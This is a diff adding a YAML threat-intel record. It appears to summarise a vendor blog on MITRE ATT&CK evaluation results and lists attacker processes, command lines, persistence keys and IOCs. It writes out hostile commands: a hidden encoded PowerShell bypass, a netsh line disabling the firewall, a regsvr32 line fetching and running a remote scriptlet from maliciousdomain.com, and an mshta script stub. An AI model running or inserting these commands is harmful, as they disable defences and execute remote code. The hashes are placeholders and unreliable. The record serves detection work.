@@ -1,0 +1,55 @@
+description: MITRE ATT&CK evaluation results for endpoint security solutions, highlighting
+  Cybereason's performance with 100% out-of-the-box detection coverage and zero false
+  positives.
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - regsvr32.exe
+  - mshta.exe
+  commandline:
+  - powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ...
+  - cmd.exe /c echo y | c:\windows\system32\netsh advfirewall set allprofiles state
+    off
+  - regsvr32.exe /s /n /u /i http://maliciousdomain.com/script.sct scrobj.dll
+  - mshta.exe javascript:var sh=new ActiveXObject("WScript.Shell"); ...
+  powershell:
+  - -NoP -NonI -W Hidden -Exec Bypass -Enc ...
+  scripting_engine:
+  - javascript:var sh=new ActiveXObject("WScript.Shell"); ...
+  registry_keys:
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+  image_load:
+  - powershell.exe -> kernel32.dll, advapi32.dll
+  - cmd.exe -> kernel32.dll, user32.dll
+  network_connections:
+  - powershell.exe -> http://maliciousdomain.com/script.sct:80
+  - regsvr32.exe -> http://maliciousdomain.com/script.sct:80
+  file_activity:
+  - C:\Windows\Temp\tempfile.txt
+  - C:\Users\user\AppData\Local\Temp\malware.exe
+  persistence:
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+  pipes:
+  - \\.\pipe\malicious_pipe
+  process_relations:
+  - powershell.exe -> cmd.exe
+  - cmd.exe -> regsvr32.exe
+IOCs:
+  hashes:
+  - 'SHA-256: abc123...'
+  - 'MD5: def456...'
+  IPs:
+  - 192.0.2.1
+  - 203.0.113.1
+  domains:
+  - maliciousdomain.com
+  URLs:
+  - http://maliciousdomain.com/script.sct
+authors:
+- Greg Day
+reference: https://www.cybereason.com/blog/2024-mitre-critical-metrics
+date_of_publication: July 28, 2025
+file_creation_date: July 28, 2025
